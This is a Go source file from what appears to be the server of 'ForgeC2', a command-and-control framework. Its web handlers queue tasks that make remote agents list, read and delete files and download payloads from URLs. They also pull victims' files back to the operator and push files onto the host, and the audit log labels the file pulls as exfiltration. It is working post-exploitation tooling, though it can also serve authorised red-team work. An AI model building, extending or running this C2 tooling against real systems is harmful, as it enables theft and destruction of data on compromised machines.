package server

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"html/template"
	"io"
	"log/slog"
	"mime/multipart"
	"net/http"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleFileBrowserPage(c *gin.Context) {
	id := c.Param("id")

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.Redirect(http.StatusFound, "/agents")
		return
	}

	data := gin.H{
		"Title":        "ForgeC2 - 文件浏览器",
		"Agent":        agent,
		"Path":         c.Query("path"),
		"ActiveNav":    "agents",
		"Online":       s.cfg.Auth.PasswordHash != "",
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "files_content", data); err != nil {
		slog.Error("Failed to render content", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())

	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

func (s *Server) handleListDir(c *gin.Context) {
	id := c.Param("id")
	path := c.PostForm("path")
	if path == "" {
		path = "C:\\"
	}

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	task := db.Task{
		AgentID: id,
		Type:    "ls",
		Command: path,
		Path:    path,
		Status:  "pending",
	}
	s.db.Create(&task)
	s.broadcastTaskUpdate(id, task)
	s.LogAuditRecord(c, "file_ls", "agent", id, path, true, nil)

	slog.Info("Directory list requested", "agent", id, "path", path)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

func (s *Server) handleFileDelete(c *gin.Context) {
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file path required"})
		return
	}

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	task := db.Task{
		AgentID: id,
		Type:    "delete",
		Command: filePath,
		Path:    filePath,
		Status:  "pending",
	}
	s.db.Create(&task)
	s.broadcastTaskUpdate(id, task)
	s.LogAuditRecord(c, "file_delete", "agent", id, filePath, true, nil)

	slog.Info("File delete requested", "agent", id, "path", filePath)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

func (s *Server) handleFileRead(c *gin.Context) {
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file path required"})
		return
	}

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	task := db.Task{
		AgentID: id,
		Type:    "read",
		Command: filePath,
		Path:    filePath,
		Status:  "pending",
	}
	s.db.Create(&task)
	s.broadcastTaskUpdate(id, task)
	s.LogAuditRecord(c, "file_read", "agent", id, filePath, true, nil)

	slog.Info("File read requested", "agent", id, "path", filePath)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

func (s *Server) handleFileUploadFromAgent(c *gin.Context) {
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file path required"})
		return
	}

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	task := db.Task{
		AgentID: id,
		Type:    "upload",
		Command: filePath,
		Path:    filePath,
		Status:  "pending",
	}
	s.db.Create(&task)
	s.broadcastTaskUpdate(id, task)
	s.LogAuditRecord(c, "file_upload_exfil", "agent", id, filePath, true, nil)

	slog.Info("File upload requested", "agent", id, "path", filePath)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

func (s *Server) handleDownload(c *gin.Context) {
	id := c.Param("id")
	fileURL := c.PostForm("url")
	targetPath := c.PostForm("path")

	if fileURL == "" || targetPath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "url and path required"})
		return
	}

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	task := db.Task{
		AgentID: id,
		Type:    "download",
		Command: fileURL,
		Shell:   targetPath,
		Path:    targetPath,
		Status:  "pending",
	}
	s.db.Create(&task)
	s.broadcastTaskUpdate(id, task)
	s.LogAuditRecord(c, "file_download_url", "agent", id, fileURL + " -> " + targetPath, true, nil)

	slog.Info("File download requested", "agent", id, "url", fileURL, "path", targetPath)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

func (s *Server) handleDownloadFile(c *gin.Context) {
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file path required"})
		return
	}

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	task := db.Task{
		AgentID: id,
		Type:    "download",
		Command: filePath,
		Path:    filePath,
		Status:  "pending",
	}
	s.db.Create(&task)
	s.broadcastTaskUpdate(id, task)
	s.LogAuditRecord(c, "file_download_exfil", "agent", id, filePath, true, nil)

	slog.Info("File download requested", "agent", id, "path", filePath)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

func (s *Server) handleUploadFile(c *gin.Context) {
	id := c.Param("id")
	targetPath := c.PostForm("target_path")
	if targetPath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "target path required"})
		return
	}

	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file required"})
		return
	}

	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	if file.Size > MaxUploadSize {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file too large (max 50MB)"})
		return
	}

	fileData, err := readFileToBase64(file)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read file"})
		return
	}

	task := db.Task{
		AgentID: id,
		Type:    "upload",
		Command: targetPath,
		Shell:   fileData,
		Path:    targetPath,
		Data:    fileData,
		Status:  "pending",
	}
	s.db.Create(&task)
	s.LogAuditRecord(c, "file_upload_push", "agent", id, targetPath, true, nil)

	slog.Info("File upload requested", "agent", id, "path", targetPath)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

func readFileToBase64(file *multipart.FileHeader) (string, error) {
	f, err := file.Open()
	if err != nil {
		return "", err
	}
	defer f.Close()

	data, err := io.ReadAll(f)
	if err != nil {
		return "", err
	}

	return base64.StdEncoding.EncodeToString(data), nil
}
